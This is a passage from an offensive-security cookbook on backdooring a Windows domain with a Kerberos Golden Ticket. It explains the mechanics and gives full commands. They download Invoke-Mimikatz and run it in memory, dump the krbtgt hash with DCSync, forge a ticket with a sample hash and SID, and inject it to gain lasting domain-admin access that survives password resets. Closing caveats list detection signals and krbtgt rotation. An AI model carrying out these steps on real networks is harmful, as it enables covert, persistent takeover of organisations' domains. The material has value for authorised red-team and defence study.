# Backdooring the domain (kerberos golden ticket):

*Note: this section continues from the previous cookbook on Mimikatz and persistence with WMI and follows demonstrations from the book "How to Hack Like a GOD: Master the Secrets of Hacking Through Real Life Scenarios" (continuing from page no. 78).*

Our goal here is simple: to retain highly privileged access to the domain, even if an admin resets every password, removes users, or patches servers. This involves leveraging Windows domain authentication mechanisms, particularly Kerberos, to create a backdoor.

Kerberos is an authentication protocol implemented by Microsoft to address NTLM weaknesses, such as replay attacks. Here are the key steps in Windows Kerberos authentication:

Initial Authentication:

The user encrypts the current timestamp with their password hash and sends it to the Domain Controller (DC). The DC decrypts the timestamp using the hash stored in Active Directory and checks if it falls within a 10-minute range. If valid, it sends back an encrypted blob called the Ticket Granting Ticket (TGT), which contains the user's identity and privileges. Only the DC can decrypt and read the TGT.

Accessing a Service:

When the user wants to access a service (e.g., a web service or network share), they send the TGT and the service's name to the DC.

The DC decrypts the TGT, retrieves the user's identity, checks their access rights, and if allowed, sends back another encrypted blob called the Ticket Granting Service (TGS). This TGS contains the user's identity and can only be read by the target service.

The user forwards the TGS to the target service, which decrypts it, retrieves the user's identity, and grants access.

The TGT is encrypted by the DC using a unique key, specifically the krbtgt account's password hash. If we can access this key, we can create our own TGT containing any identity, such as the main domain admin account (Administrator).

By controlling the TGT, we can set its validity time, potentially making it last for years instead of the standard 10 minutes.

This ticket remains valid even if the administrator's password changes.

The krbtgt hash provides access to all domains within the forest, making it the ultimate backdoor.

To achieve full persistent access to the domain (forest), we need the krbtgt's password hash. There are various ways to obtain it:

- Dumping the Active Directory Database:

This method involves extracting the NTDS.DIT file from the domain controller and parsing all accounts. It is slow and cumbersome.

- Using DCSync:

A more efficient method is to use DCSync, which leverages domain controller synchronization mechanisms. Domain controllers regularly exchange password hashes to delegate authentication. By impersonating a Domain Controller, we can request any account's password hash from a legitimate Domain Controller.

Of course, with domain admin privileges, we can use the tool Mimikatz to perform a DCSync attack and generate a Golden Ticket.

Before talking to the DC (Domain Controller), we need to spawn a session using Rachel’s credentials (the compromised admin account from previous cookbook). We may be NT AUTHORITY on the local Citrix system, but we need a domain admin session to perform DC Sync operations:

```
PS > runas /user:GBSHOP\rachel_adm powershell
```

This command will open a new PowerShell session running under the credentials of the rachel_adm account. The runas command allows you to execute a program as another user, providing the necessary privileges for subsequent actions.

After verifying everything with the whoami command, we use the same trick as before (Invoke-Expression) to download Mimikatz and invoke it in memory. Then we call the dcsync option to grab the krbtgt account's password hash:

```
PS > Invoke-mimikatz -Command '"lsadump::dcsync /domain:GBSHOP.CORP /user:krbtgt"'
```

Note: here is the full process as a reminder:

```
# Step 1: Download the Invoke-Mimikatz script
PS > $browser = New-Object System.Net.WebClient
PS > $browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

# Step 2: Store the downloaded script into a variable
PS > $mimi = $browser.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1")

# Step 3: Invoke the downloaded script in memory
PS > Invoke-Expression $mimi

# Step 4: Perform the dcsync operation to retrieve the krbtgt password hash
PS > Invoke-Mimikatz -Command '"lsadump::dcsync /domain:GBSHOP.CORP /user:krbtgt"'
```

The dcsync command in Mimikatz mimics the behavior of a domain controller requesting replication of account information, in this case, the krbtgt account. This gives us access to the password hash for the krbtgt account, which is crucial for creating a Golden Ticket.

In the output (not shown here), we will find the credentials in NTLM hash form. We safely store this hash on the attack server. To generate a Golden Ticket, we also need to determine the domain’s SID (Security Identifier), a unique object identifier on Windows:

```
PS C:\users\public> whoami /user

User Name           SID
================= =========================
gbshop\rachel_adm S-1-5-21-2376009117-2296651833-4279148973-1116
```

The whoami /user command displays the SID for the current user. This SID is required for creating the Golden Ticket.

We then use Mimikatz to create a Golden Ticket impersonating the main Windows domain Administrator account:

Note: the very ending of the SID (including the dash) needs to be removed before the next step (i.e. -1116)

```
PS C:\users\public> Invoke-Mimikatz -Command '"kerberos::golden /admin:Administrator /domain:gbshop.corp /krbtgt:6a5c12974ec341dd244b693ad4d38369 /sid:S-1-5-21-2376009117-2296651833-4279148973 /ticket:admin.kirbi"'
```

This command generates a Golden Ticket, a forged Kerberos Ticket Granting Ticket (TGT), using the krbtgt NTLM hash, the domain SID, and specifying the Administrator account. The generated ticket is saved to a file named admin.kirbi.

The final ticket will be saved to a file, presumably located in the public directory (please verify the exact location where the file is saved).

Next time we want to use this Golden Ticket from a new Empire session, for instance, we issue the following command:

```
PS C:\users\public> Invoke-Mimikatz -Command '"sekurlsa::ptt admin.kirbi"'
```

The sekurlsa::ptt command injects the Golden Ticket (admin.kirbi) into the current session, granting full domain admin privileges. This allows execution of commands, adding users, and performing other administrative tasks on the domain.

Mimikatz will inject the admin’s ticket into the current session, granting us full domain admin privileges. We can then issue WMI commands on remote servers, execute commands, add users, etc. The only way to lose a Golden Ticket is to change the krbtgt password twice.

Some caveats and concerns worth noting:

- Using Mimikatz and performing DC Sync operations can trigger security alerts. Organizations with good monitoring practices may detect such activities quickly. For example, SIEM (Security Information and Event Management) systems aggregate logs from various sources, including endpoints, network devices, and servers. They can correlate events and trigger alerts on suspicious activities, such as unauthorized DC Sync requests or unusual access to privileged accounts.

- Even if Mimikatz is obfuscated or run from memory to avoid signature detection, its actions (like accessing LSASS memory or performing certain API calls) can still be flagged by behavior-based detection systems. Also, network monitoring tools can detect unusual replication traffic patterns. If a system that is not a DC suddenly starts communicating with a DC using DRS protocol, it can raise red flags.

- Actions performed by Mimikatz, such as dumping credentials or injecting tickets, often leave traces in event logs. For instance, accessing LSASS or modifying Kerberos tickets can generate specific Windows event logs that can be monitored. Windows logs DC Sync operations in the Security event log. Look for events like Event ID 4662 (An operation was performed on an object) and Event ID 4673 (A privileged service was called). These events can indicate unauthorized replication operations.

- DC Sync is a feature of the Directory Replication Service (DRS) Remote Protocol that allows a Domain Controller (DC) to replicate data from another DC. Mimikatz can abuse this functionality to replicate (or "sync") user account credentials, including password hashes, from a DC. DC Sync requests should typically only be seen between actual Domain Controllers. If a non-DC system is making DC Sync requests, it is highly suspicious and can be flagged by security monitoring systems.

- Although a Golden Ticket can be set to a long lifespan, using it indiscriminately can raise suspicion.

- Changing krbtgt Password: The Golden Ticket remains valid until the krbtgt password is changed twice. Regularly changing this password can help mitigate the risk of Golden Ticket attacks.
